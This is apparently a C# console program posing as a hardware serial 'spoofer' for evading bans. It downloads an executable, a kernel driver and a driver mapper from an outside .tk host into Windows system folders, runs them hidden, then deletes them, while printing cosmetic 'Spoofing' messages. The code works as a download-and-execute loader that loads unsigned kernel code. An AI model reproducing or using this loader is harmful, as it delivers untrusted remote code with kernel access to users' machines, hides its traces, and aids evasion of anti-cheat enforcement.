using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Threading;

namespace Spoofer_menu_test;

internal class Program
{
	private static void Main(string[] args)
	{
		Console.Title = "LOL.XYZ Spoofer";
		WebClient webClient = new WebClient();
		Process process = new Process();
		Thread.Sleep(1000);
		Print.prints();
		string text = Console.ReadLine();
		if (text == "1")
		{
			Console.Clear();
			Console.WriteLine("Old serials");
			ProcessStartInfo processStartInfo = new ProcessStartInfo();
			Console.ForegroundColor = ConsoleColor.Red;
			string text2 = "wmic diskdrive get serialnumber && WMIC BIOS GET SERIALNUMBER";
			processStartInfo.UseShellExecute = false;
			processStartInfo.WorkingDirectory = "C:\\Windows\\System32";
			processStartInfo.FileName = "C:\\Windows\\System32\\cmd.exe";
			processStartInfo.Verb = "runas";
			processStartInfo.Arguments = "/c " + text2;
			Process.Start(processStartInfo);
			Console.ResetColor();
			Thread.Sleep(5000);
			Console.WriteLine("[!] Spoofing Diskdrive");
			Thread.Sleep(1000);
			Console.WriteLine("[!] Spoofing Volume");
			Thread.Sleep(1000);
			Console.WriteLine("[!] Spoofing SMBIOS");
			Thread.Sleep(1000);
			Console.WriteLine("[!] Spoofing GPU");
			Thread.Sleep(1000);
			Console.WriteLine("[!] Spoofing Bios");
			string text3 = "C:\\Windows\\BIOS.exe";
			webClient.DownloadFile("http://overhaxweebloader.tk/freespoof/BIOSSPOOFEROVERHAX.exe", text3);
			process.StartInfo.UseShellExecute = false;
			process = Process.Start(text3);
			Thread.Sleep(1000);
			process.Close();
			File.Delete(text3);
			process.WaitForExit();
			Thread.Sleep(5000);
			Thread.Sleep(1000);
			string text4 = "C:\\Windows\\IME\\mapper.exe";
			string text5 = "C:\\Windows\\IME\\spoof.sys";
			webClient.DownloadFile("http://overhaxweebloader.tk/freespoof/OVERHAXSPOOFERDRIVER.sys", text5);
			webClient.DownloadFile("http://overhaxweebloader.tk/freespoof/mapper.exe", text4);
			process.StartInfo.FileName = "cmd.exe";
			process.StartInfo.UseShellExecute = true;
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process = Process.Start(text4, text5);
			Thread.Sleep(1000);
			process.Close();
			File.Delete(text5);
			File.Delete(text4);
			Thread.Sleep(2000);
			Console.WriteLine("Old serials");
			Console.ForegroundColor = ConsoleColor.Green;
			string text6 = "wmic diskdrive get serialnumber && WMIC BIOS GET SERIALNUMBER";
			processStartInfo.UseShellExecute = false;
			processStartInfo.WorkingDirectory = "C:\\Windows\\System32";
			processStartInfo.FileName = "C:\\Windows\\System32\\cmd.exe";
			processStartInfo.Verb = "runas";
			processStartInfo.Arguments = "/c " + text6;
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			Process.Start(processStartInfo);
			Console.ResetColor();
			Thread.Sleep(5000);
			Console.WriteLine("Spoofed successfully");
			Print.prints();
		}
		else
		{
			Print.prints();
		}
		if (text == "2")
		{
			Console.Clear();
			Thread.Sleep(1000);
			Print.Clean();
			Console.WriteLine("Cleaned successfully");
			Print.prints();
		}
		else
		{
			Print.prints();
		}
	}
}
